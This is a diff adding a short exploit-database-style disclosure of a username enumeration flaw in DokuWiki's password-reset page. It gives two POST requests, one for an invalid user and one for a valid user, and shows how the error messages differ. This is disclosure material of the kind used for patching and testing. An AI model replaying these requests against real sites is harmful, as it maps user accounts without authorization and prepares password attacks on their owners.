@@ -1,0 +1,37 @@
+# Exploit Title: Dokuwiki 2018-04-22b - Username Enumeration
+# Date: 2019-12-01
+# Exploit Author: Talha ŞEN
+# Vendor Homepage: https://www.dokuwiki.org/dokuwiki
+# Software Link: https://download.dokuwiki.org/
+# Version: 2018-04-22b "Greebo"
+# Tested on: 
+# Alpine Linux 3.5 (docker image)
+# PHP 5.6.30
+# Apache/2.4.25 (Unix)
+# CVE : 
+
+# At login page there is a "set new password" page as below:
+# Forgotten your password? Get a new one: Set new password
+# At this page there is username enumeration vulnerability.
+# Testing for non-valid user:
+
+POST /doku.php?id=start&do=resendpwd HTTP/1.1
+
+sectok=&do=resendpwd&save=1&login=sss
+
+# Response for non-valid user(sss):
+
+<div class="error">Sorry, we can't find this user in our database.</div>
+
+========================================================================
+
+# Testing for valid user:
+
+POST /doku.php?id=start&do=resendpwd HTTP/1.1
+
+sectok=&do=resendpwd&save=1&login=admin
+
+# Response for valid user (admin):
+
+<div class="error">There was an unexpected problem communicating with SMTP: Could not open SMTP Port.</div>
+<div class="error">Looks like there was an error on sending the password mail. Please contact the admin!</div>
